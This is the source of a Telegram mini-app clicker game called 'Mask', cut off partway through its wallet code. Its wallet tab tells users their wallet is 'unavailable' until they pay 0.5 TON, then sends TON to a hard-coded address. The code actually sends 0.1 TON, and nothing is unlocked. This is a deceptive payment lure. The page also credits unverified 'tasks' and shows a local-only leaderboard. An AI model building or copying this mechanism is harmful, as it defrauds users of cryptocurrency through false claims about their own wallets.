<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <title>Mask???</title>
    <style>
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            flex-direction: column;
            background-color: #000;
            color: #fff;
            background-image: url('bg.jpg');
            background-size: cover;
            background-position: center;
            overflow: auto;
        }
        .content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.5);
        }
        .coins {
            font-size: 30px;
            font-weight: bold;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px 20px;
            border-radius: 10px;
            margin-top: -20px;
        }
        .navbar {
            display: flex;
            justify-content: space-around;
            background-color: #1a1a1a;
            color: #fff;
            padding: 10px 0;
            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.5);
            position: fixed;
            bottom: 0;
            width: 100%;
            z-index: 1000;
        }

        .navbar button {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 4vw; /* –ò—Å–ø–æ–ª—å–∑—É–µ–º viewport width –¥–ª—è —Ä–∞–∑–º–µ—Ä–∞ —Ç–µ–∫—Å—Ç–∞ */
            flex: 1;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
            margin: 0 1%; /* –ú–µ–Ω—å—à–∏–π –æ—Ç—Å—Ç—É–ø –¥–ª—è –ª—É—á—à–µ–π –∞–¥–∞–ø—Ç–∞—Ü–∏–∏ */
            border-radius: 5px;
            max-width: 30%; /* –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é —à–∏—Ä–∏–Ω—É –∫–Ω–æ–ø–æ–∫ */
        }

        .navbar button:hover {
            background-color: #555;
            transform: scale(1.05);
        }

        .navbar button:active {
            background-color: #777;
            transform: scale(0.95);
        }

        /* –ú–µ–¥–∏–∞-–∑–∞–ø—Ä–æ—Å –¥–ª—è –±–æ–ª–µ–µ –º–µ–ª–∫–∏—Ö —ç–∫—Ä–∞–Ω–æ–≤ */
        @media (max-width: 600px) {
            .navbar button {
                padding: 10px;
                font-size: 5vw; /* –ë–æ–ª—å—à–µ —à—Ä–∏—Ñ—Ç –Ω–∞ –º–∞–ª–µ–Ω—å–∫–∏—Ö —ç–∫—Ä–∞–Ω–∞—Ö */
                margin: 0 2%; /* –£–º–µ–Ω—å—à–∏—Ç—å –æ—Ç—Å—Ç—É–ø—ã –º–µ–∂–¥—É –∫–Ω–æ–ø–∫–∞–º–∏ */
            }
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.5s ease-in-out;
        }
        .modal-content {
            background-color: #fff;
            color: #000;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            text-align: center;
            border-radius: 10px;
            animation: zoomIn 0.5s ease-in-out;
        }
        .modal-content h2 {
            margin: 0 0 20px;
        }
        .modal-content p {
            font-size: 20px;
            margin: 10px 0;
        }
        .modal-content button {
            background-color: #000;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        .modal-content button:hover {
            background-color: #444;
        }
        .leaderboard {
            text-align: center;
            margin-top: 2px;
            padding: 20px;
            border-radius: 10px;
            background: none; /* –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–æ–Ω–∞ */
        }
        .player-rank {
            background: rgba(255, 255, 255, 0); /* –ü—Ä–æ–∑—Ä–∞—á–Ω—ã–π —Ñ–æ–Ω */
            border: 3px solid white; /* –ó–æ–ª–æ—Ç–∞—è —Ä–∞–º–∫–∞ */
            color: #fff; /* –ß–µ—Ä–Ω—ã–π —Ç–µ–∫—Å—Ç */
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            text-align: center;
            font-size: 20px;
            position: relative; /* –î–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –ø–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —ç–º–æ–¥–∑–∏ */
        }
        .player-rank p {
            margin: 0; /* –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç—Å—Ç—É–ø–æ–≤ */
            font-size: 24px; /* –ë–æ–ª—å—à–æ–π —Ä–∞–∑–º–µ—Ä —à—Ä–∏—Ñ—Ç–∞ */
            font-weight: bold; /* –ñ–∏—Ä–Ω—ã–π —à—Ä–∏—Ñ—Ç */
        }
        .player-rank::before {
            content: 'üéØ'; /* –≠–º–æ–¥–∑–∏ –º–∏—à–µ–Ω–∏ */
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px; /* –†–∞–∑–º–µ—Ä —ç–º–æ–¥–∑–∏ */
        }
        .leaderboard-info {
            display: flex;
            justify-content: space-between; /* –†–∞–≤–Ω–æ–º–µ—Ä–Ω–æ–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ */
            align-items: center; /* –í—ã—Ä–∞–≤–Ω–∏–≤–∞–Ω–∏–µ –ø–æ —Ü–µ–Ω—Ç—Ä—É –ø–æ –≤–µ—Ä—Ç–∏–∫–∞–ª–∏ */
            margin: 10px 0;
            font-size: 20px;
            width: 100%;
        }
        .leaderboard-info span {
            margin: 0 10px; /* –û—Ç—Å—Ç—É–ø –º–µ–∂–¥—É —ç–ª–µ–º–µ–Ω—Ç–∞–º–∏ */
        }
        .leaderboard ul {
            list-style: none;
            padding: 0;
            margin: 0;
            width: 100%; /* –†–∞—Å—Ç—è–Ω—É—Ç—å –Ω–∞ –≤—Å—é —à–∏—Ä–∏–Ω—É —ç–∫—Ä–∞–Ω–∞ */
            box-sizing: border-box; /* –£—á–∏—Ç—ã–≤–∞—Ç—å padding –∏ border –≤ —à–∏—Ä–∏–Ω–µ —ç–ª–µ–º–µ–Ω—Ç–∞ */
        }
        .leaderboard li {
            background: rgba(255, 255, 255, 0.5); /* –ë–µ–ª—ã–π –ø–æ–ª—É–ø—Ä–æ–∑—Ä–∞—á–Ω—ã–π —Ñ–æ–Ω */
            color: #000; /* –ß–µ—Ä–Ω—ã–π —Ç–µ–∫—Å—Ç */
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            display: flex;
            align-items: center;
            width: 90vw; /* –†–∞—Å—Ç—è–Ω—É—Ç—å –Ω–∞ –≤—Å—é —à–∏—Ä–∏–Ω—É —ç–∫—Ä–∞–Ω–∞ */
            box-sizing: border-box; /* –£—á–∏—Ç—ã–≤–∞—Ç—å padding –∏ border –≤ —à–∏—Ä–∏–Ω–µ —ç–ª–µ–º–µ–Ω—Ç–∞ */
        }
        .leaderboard .avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #fff;
            text-transform: uppercase;
            margin-right: 10px;
        }
        .leaderboard li span {
            display: inline-block;
            width: auto; /* –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —à–∏—Ä–∏–Ω–∞ */
        }
        .leaderboard li span.rank {
            margin-right: 10px; /* –û—Ç—Å—Ç—É–ø –º–µ–∂–¥—É –º–µ–¥–∞–ª—å–∫–æ–π –∏ –∞–≤–∞—Ç–∞—Ä–∫–æ–π */
        }
        .leaderboard li span:last-child {
            text-align: right;
            flex: 1; /* –ó–∞–Ω–∏–º–∞–µ—Ç –≤—Å—ë –¥–æ—Å—Ç—É–ø–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ */
        }
        .leaderboard li::before {
            margin-right: 10px; /* –û—Ç—Å—Ç—É–ø –º–µ–∂–¥—É –Ω–æ–º–µ—Ä–æ–º –∏ –Ω–∏–∫–æ–º */
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.5s ease-in-out;
        }
        .modal-content {
            background-color: #fff;
            color: #000;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            text-align: center;
            border-radius: 10px;
            animation: zoomIn 0.5s ease-in-out;
        }
        .modal-content h2 {
            margin: 0 0 20px;
        }
        .modal-content p {
            font-size: 20px;
            margin: 10px 0;
        }
        .modal-content button {
            background-color: #000;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        .modal-content button:hover {
            background-color: #444;
        }


        /* –°—Ç–∏–ª–∏ –¥–ª—è –≤–∫–ª–∞–¥–∫–∏ –ó–∞–¥–∞–Ω–∏—è */
        .tasks {
            text-align: center;
            margin-top: 20px;
            padding-bottom: 66px;
        }
        .task-block {
            background: rgba(255, 255, 255, 0.9);
            color: #000;
            padding: 15px;
            border-radius: 10px;
            margin: 20px auto;
            text-align: center;
            width: 90%;
            position:relative;
            border: 1px solid #ddd;
        }
        .task-block h3 {
            margin-top: 0;
            font-size: 22px;
            font-weight: bold;
        }
        .task {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 0;
        }
        .task img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 10px;
        }
        .task-button {
            padding: 10px 20px;
            font-size: 14px;
            background-color: #000;
            color: #fff;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            width: 100px; /* —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —à–∏—Ä–∏–Ω–∞ –¥–ª—è –∫–Ω–æ–ø–æ–∫*/
            text-align: center;
        }

        .task-button.completed {
            background-color: #414141;
            color: rgb(255, 255, 255);
            border: none;
            width: 60px; /* —Ç–∞ –∂–µ —à–∏—Ä–∏–Ω–∞, —á—Ç–æ –∏ —É –∫–Ω–æ–ø–∫–∏ */
            text-align: center;
        }

        .task-button:hover {
            background-color: #444;
        }

        .task-button:disabled {
            background-color: #666;
            cursor: not-allowed;
        }



        .task .status {
            font-size: 18px;
            color: green;
        }
        .task .status.hidden {
            display: none;
        }
        .task .description {
            flex: 1;
            text-align: left;
            padding-left: 10px;
            font-size: 16px;
        }

        #static-timer {
            font-size: 48px;
            font-weight: bold;
            color: #333; /* –ò–∑–º–µ–Ω–∏—Ç–µ –Ω–∞ –∂–µ–ª–∞–µ–º—ã–π —Ü–≤–µ—Ç —Ç–µ–∫—Å—Ç–∞ */
            text-align: center;
            margin-top: 15px;
        }


    </style>
</head>
<body>
    <!-- <div id="ton-connect"></div>
    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://mask-bot.github.io/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });
    </script> -->

    <div id="welcomeModal" class="modal" style="display: none;">
        <div class="modal-content">
            <h2>Welcome Bonus</h2>
            <p>+0.00146 $MASKS</p>
            <button onclick="claimBonus()">Get</button>
        </div>
    </div>
    

    <div id="home-page">
        <div id="static-timer">00:00:00</div>
    </div>
    
    <div class="content" id="mainContent">
        <div class="leaderboard" id="leaderboard" style="display: none;">
            <h1>Leaders</h1>
            <div class="player-rank">
                <p id="userRank">Your place: --</p>
            </div>
            <div class="leaderboard-info">
                <span id="userCount">0 players</span>
                <span id="top10">(Top 10)</span>
            </div>
            <ul id="leaderboardList"></ul>
        </div>
        <div class="coins">0 $MASKS</div>
    </div>
    <div class="navbar">
        <button onclick="showHome()">
            <img src="home_icon.png" alt="home" style="width: 30px; height: 30px;">
        </button>
        <button onclick="showLeaderboard()">
            <img src="leaderboard_icon.png" alt="leaderboard" style="width: 30px; height: 30px;">
        </button>
        <button onclick="showTasks()">
            <img src="tasks_icon.png" alt="tasks" style="width: 30px; height: 30px;">
        </button>
        <button onclick="clearContent()">
            <img src="friends_icon.png" alt="friends" style="width: 30px; height: 30px;">
        </button>
        <button onclick="wallet()">
            <img src="wallet_icon.png" alt="wallet" style="width: 30px; height: 30px;">
        </button>
    </div>    

    <script async src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        let coins = 0;
        let username = '';
        let leaderboard = [];

        window.onload = function() {
            Telegram.WebApp.expand(); // –†–∞–∑–≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
            Telegram.WebApp.ready();
            const user = Telegram.WebApp.initDataUnsafe.user;
            if (user) {
                username = user.username || user.first_name;
            }
            loadProgress();
            document.getElementById('welcomeModal').style.display = 'flex';
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ —Å –±–æ–Ω—É—Å–æ–º
        function showWelcomeBonusModal() {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–ª—É—á–∏–ª –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –±–æ–Ω—É—Å
            if (!localStorage.getItem('bonusClaimed')) {
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ, –µ—Å–ª–∏ –±–æ–Ω—É—Å –µ—â–µ –Ω–µ –±—ã–ª –ø–æ–ª—É—á–µ–Ω
                document.getElementById('welcomeModal').style.display = 'block';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–Ω—É—Å–∞
        function claimBonus() {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–ª—É—á–∏–ª –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –±–æ–Ω—É—Å
            if (localStorage.getItem('bonusClaimed')) {
                alert('You have already received your welcome bonus!');
                return; // –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ –±–æ–Ω—É—Å —É–∂–µ –±—ã–ª –ø–æ–ª—É—á–µ–Ω
            }

            // –ï—Å–ª–∏ –±–æ–Ω—É—Å –µ—â–µ –Ω–µ –±—ã–ª –ø–æ–ª—É—á–µ–Ω, –¥–æ–±–∞–≤–ª—è–µ–º –µ–≥–æ
            coins += 0.00146;
            document.getElementById('welcomeModal').style.display = 'none';
            saveProgress();
            updateCoins();
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–º, —á—Ç–æ –±–æ–Ω—É—Å –±—ã–ª –ø–æ–ª—É—á–µ–Ω
            localStorage.setItem('bonusClaimed', 'true');
        }

        // –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–∫–∞–∑–∞ –±–æ–Ω—É—Å–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = showWelcomeBonusModal;


        function updateCoins() {
            document.querySelector('.coins').textContent = coins + ' $MASKS';
        }

        function clearContent() {
            document.getElementById('mainContent').innerHTML = '';
        }

        function showHome() {
            document.getElementById('mainContent').innerHTML = '<div class="coins">' + coins + ' $MASKS</div>';
            updateCoins();
        }

        function showLeaderboard() {
            updateLeaderboard();
            const totalUsers = leaderboard.length;
            document.getElementById('mainContent').innerHTML = 
                '<div class="leaderboard" id="leaderboard">' +
                    '<h1>Leaders</h1>' +
                    '<div class="player-rank">' +
                        '<p id="userRank">Your place: --</p>' +
                    '</div>' +
                    '<div class="leaderboard-info">' +
                        '<span id="userCount">' + totalUsers + ' ' + getPlayersText(totalUsers) + '</span>' +
                        '<span id="top10">(Top 10)</span>' +
                    '</div>' +
                    '<ul id="leaderboardList"></ul>' +
                '</div>';
            renderLeaderboard();
        }

       
        

        function showTasks() {
            const advertisers = [
                {
                    name: '–†–µ–∫–ª–∞–º–æ–¥–∞—Ç–µ–ª—å 1',
                    tasks: [
                        {description: 'Subscribe to Telegram', link: 'https://t.me/your_channel_1', reward: '+0.00033 $MASKS'},
                        {description: 'Subscribe to Instagram', link: 'https://instagram.com/your_instagram', reward: '+0.00033 $MASKS'},
                        {description: 'Subscribe to YouTube', link: 'https://youtube.com/your_youtube_channel', reward: '+0.00033 $MASKS'}
                    ]
                },
                {
                    name: '–†–µ–∫–ª–∞–º–æ–¥–∞—Ç–µ–ª—å 2',
                    tasks: [
                        {description: 'Subscribe to Facebook', link: 'https://facebook.com/your_facebook_page', reward: '+0.00033 $MASKS'},
                        {description: 'Subscribe to Twitter', link: 'https://twitter.com/your_twitter', reward: '+0.00033 $MASKS'}
                    ]
                }
            ];

            const tasksHTML = advertisers.map(advertiser => {
                const tasks = advertiser.tasks.map(task => {
                    const isCompleted = tasksCompleted[task.description];
                    return `
                        <div class="task" style="display: flex; align-items: center; margin-bottom: 10px;">
                            <img src="https://via.placeholder.com/60" alt="Avatar" style="width: 60px; height: 60px; margin-right: 10px;">
                            <div class="task-details" style="flex-grow: 1;">
                                <div class="description" style="font-size: 14px; font-weight: bold;">${task.description}</div>
                                <div class="reward" style="font-size: 14px; color: green; margin-top: 5px; font-weight: bold; text-align: left; margin-left: 10px;">${task.reward}</div>
                            </div>
                            ${isCompleted ? 
                                `<div class="task-button completed">Done</div>` : 
                                `<button id="button-${task.description}" class="task-button" onclick="completeTask('${task.description}', '${task.reward}')">Do</button>`
                            }
                        </div>
                    `;
                }).join('');
                return `
                    <div class="task-block">
                        <h3>${advertiser.name}</h3>
                        ${tasks}
                    </div>
                `;
            }).join('');

            document.getElementById('mainContent').innerHTML = `<div class="tasks">${tasksHTML}</div>`;
        }

        function completeTask(taskDescription, reward) {
            const button = document.getElementById(`button-${taskDescription}`);
            
            if (button.innerText === "Do") {
                button.innerText = "Check";
            } else if (button.innerText === "Check") {
                button.outerHTML = `<div class="task-button completed">Done</div>`;
                if (!tasksCompleted[taskDescription]) {
                    tasksCompleted[taskDescription] = true;
                    addMasksToBalance(reward);
                    saveTasks();
                }
            }
        }
        
        function addMasksToBalance(reward) {
            const rewardValue = parseFloat(reward);  // –ù–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º —á–∏—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
            coins += rewardValue; // –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å
            saveProgress(); // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å
            updateCoins(); // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –Ω–∞ —ç–∫—Ä–∞–Ω–µ
        }


        function saveTasks() {
            localStorage.setItem('tasksCompleted', JSON.stringify(tasksCompleted));
        }

        function loadTasks() {
            tasksCompleted = JSON.parse(localStorage.getItem('tasksCompleted')) || {};
        }

        // –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            Telegram.WebApp.ready();
            const user = Telegram.WebApp.initDataUnsafe.user;
            if (user) {
                username = user.username || user.first_name;
            }
            loadProgress();
            loadLeaderboard();
            loadTasks();
            Telegram.WebApp.expand(); // –†–∞–∑–≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
            showHome(); // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤–∫–ª–∞–¥–∫—É "–î–æ–º–æ–π" –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        }



        function updateLeaderboard() {
            const userEntry = leaderboard.find(entry => entry.username === username);
            if (userEntry) {
                userEntry.coins = coins;
            } else {
                leaderboard.push({ username: username, coins: coins });
            }
            leaderboard.sort((a, b) => b.coins - a.coins);
            saveLeaderboard();
        }

        function renderLeaderboard() {
            const leaderboardList = document.getElementById('leaderboardList');
            const userRankElem = document.getElementById('userRank');
            leaderboardList.innerHTML = '';
            let userRank = null;
            
            leaderboard.forEach((entry, index) => {
                if (index >= 10) return;
                const li = document.createElement('li');
                const rank = index + 1;
                const rankText = rank <= 3 ? (rank === 1 ? 'ü•á' : rank === 2 ? 'ü•à' : 'ü•â') : `#${rank}`;
                
                // –°–æ–∑–¥–∞–Ω–∏–µ –∞–≤–∞—Ç–∞—Ä–∫–∏
                const avatar = document.createElement('div');
                avatar.className = 'avatar';
                avatar.style.backgroundColor = getRandomColor(); // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Ü–≤–µ—Ç–∞
                avatar.textContent = entry.username.substring(0, 2);
                
                // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –º–µ–¥–∞–ª—å–∫–∏ –∏ –∞–≤–∞—Ç–∞—Ä–∫–∏ —Å –æ—Ç—Å—Ç—É–ø–æ–º
                li.innerHTML = `<span class="rank">${rankText}</span>`;
                li.appendChild(avatar);
                li.innerHTML += `<span>${entry.username}</span><span>${entry.coins} $MASKS</span>`;
                leaderboardList.appendChild(li);
                
                if (entry.username === username) {
                    userRank = rank;
                }
            });
            
            // –ï—Å–ª–∏ –∏–≥—Ä–æ–∫ –Ω–µ –≤ —Ç–æ–ø-10, –Ω–∞—Ö–æ–¥–∏–º –µ–≥–æ –º–µ—Å—Ç–æ –≤ –æ–±—â–µ–º —Å–ø–∏—Å–∫–µ
            if (userRank === null) {
                const overallRank = leaderboard.findIndex(entry => entry.username === username) + 1;
                userRankElem.textContent = 'Your place: ' + (overallRank ? overallRank : '--');
            } else {
                userRankElem.textContent = 'Your place: ' + userRank;
            }
        }

        function getRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }

        function getPlayersText(count) {
            if (count === 1) {
                return 'player';
            } else {
                return 'players';
            }
        }


        function joinTelegramChannel(url) {
            window.open(url, '_blank');
            // –ü–æ—Å–ª–µ –ø–æ–¥–ø–∏—Å–∫–∏ –¥–æ–±–∞–≤—å—Ç–µ –ª–æ–≥–∏–∫—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–¥–∞–Ω–∏—è
            // –ü—Ä–∏–º–µ—Ä:
            // tasksCompleted[url] = true;
            // updateTaskStatuses();
        }

        function saveProgress() {
            localStorage.setItem('coins', coins);
        }

        function loadProgress() {
            const savedCoins = localStorage.getItem('coins');
            if (savedCoins !== null) {
                coins = parseInt(savedCoins, 10);
                updateCoins();
            }
        }

        function loadProgress() {
            coins = parseFloat(localStorage.getItem('coins')) || 0;
            updateCoins();
        }

        function saveLeaderboard() {
            localStorage.setItem('leaderboard', JSON.stringify(leaderboard));
        }

        function loadLeaderboard() {
            leaderboard = JSON.parse(localStorage.getItem('leaderboard')) || [];
        }

        // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –Ω–∞—á–∞–ª–∞ –∏ –æ–∫–æ–Ω—á–∞–Ω–∏—è —Ç–∞–π–º–µ—Ä–∞
        const startTime = new Date('2024-10-06T12:15:00+03:00').getTime(); // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –Ω–∞—á–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è
        const endTime = new Date('2025-01-01T00:00:00Z').getTime();

        function updateTimer() {
            const now = new Date().getTime();
            const remainingTime = endTime - now;

            if (remainingTime < 0) {
                document.getElementById("static-timer").innerHTML = "00:00:00";
                return; // –ó–∞–≤–µ—Ä—à–∞–µ–º, –µ—Å–ª–∏ –≤—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ
            }

            // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –¥–Ω–∏, —á–∞—Å—ã, –º–∏–Ω—É—Ç—ã –∏ —Å–µ–∫—É–Ω–¥—ã
            const days = Math.floor(remainingTime / (1000 * 60 * 60 * 24));
            const hours = Math.floor((remainingTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));


            

            // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–π–º–µ—Ä –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            document.getElementById("static-timer").innerHTML = 
                `${days}:${hours}:${minutes}`;
        }

        // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–π–º–µ—Ä –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
        setInterval(updateTimer, 1000);

        function wallet() {
            document.getElementById('mainContent').innerHTML = `
                <div style="width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
                    <div id="ton-connect-button"></div>
                    <div id="walletAddress" style="margin-top: 20px; font-size: 1.2em;"></div>
                    <div id="walletInfo" style="display: none; margin-top: 10px; color: red; font-size: 0.9em;">
                        Your wallet is unavailable. To make it available, please perform a transaction of 0.5 TON.
                    </div>
                    <button id="unlockButton" style="margin-top: 15px; padding: 10px 20px; font-size: 1em; cursor: pointer;" class="blocked" disabled>
                        Unlock Wallet
                    </button>

                    <!-- Donation buttons are now always visible -->
                    <div id="donateButtons" style="margin-top: 20px;">
                        <button class="donateButton" data-amount="0.3" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
                            Donate 0.3 TON
                        </button>
                        <button class="donateButton" data-amount="0.5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
                            Donate 0.5 TON
                        </button>
                        <button class="donateButton" data-amount="1" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
                            Donate 1 TON
                        </button>
                        <button class="donateButton" data-amount="5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
                            Donate 5 TON
                        </button>
                    </div>
                </div>
            `;

            const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://mask-bot.github.io/tonconnect-manifest.json',
                buttonRootId: 'ton-connect-button'
            });

            let walletAddress;

            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
            tonConnectUI.onStatusChange(async (wallet) => {
                if (wallet) {
                    walletAddress = wallet.account.address;
                    document.getElementById("walletInfo").style.display = "block";
                    document.getElementById("unlockButton").disabled = false; // –í–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –ø–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
                    document.getElementById("walletAddress").textContent = `Wallet Address: ${walletAddress}`;
                }
            });

            // –§—É–Ω–∫—Ü–∏—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –∫–æ—à–µ–ª—å–∫–∞
            async function unlockWallet() {
                try {
                    const tx = await tonConnectUI.sendTransaction({
                        validUntil: Math.floor(Date.now() / 1000) + 600, // –í—Ä–µ–º—è –∂–∏–∑–Ω–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (10 –º–∏–Ω—É—Ç)
                        messages: [
                            {
                                address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞
                                amount: '100000000', // 0.5 TON (–≤ –Ω–∞–Ω–æ–∫–æ–∏–Ω–∞—Ö)
                                payload: '',
                            }
                        ]
                    });

                    alert('Transaction sent successfully!');
                    document.getElementById("statusText").textContent = "Status: Unlocked";
                    document.getElementById("unlockButton").textContent = "Wallet Unlocked";
                    document.getElementById("unlockButton").classList.replace("blocked", "unblocked");
                    document.getElementById("unlockButton").disabled = true; // –û—Ç–∫–ª—é—á–∞–µ–º –∫–Ω–æ–ø–∫—É –ø–æ—Å–ª–µ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
                } catch (error) {
                    alert('Error sending transaction: ' + error.message);
                }
            }

            // –ü—Ä–∏–≤—è–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –∫ –∫–Ω–æ–ø–∫–µ
            document.getElementById('unlockButton').onclick = unlockWallet;

            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–æ–Ω–∞—Ç–æ–≤
            document.querySelectorAll('.donateButton').forEach(button => {
                button.onclick = async () => {
                    const amount = button.getAttribute('data-amount');
                    let nanocoinsAmount, rewardValue;

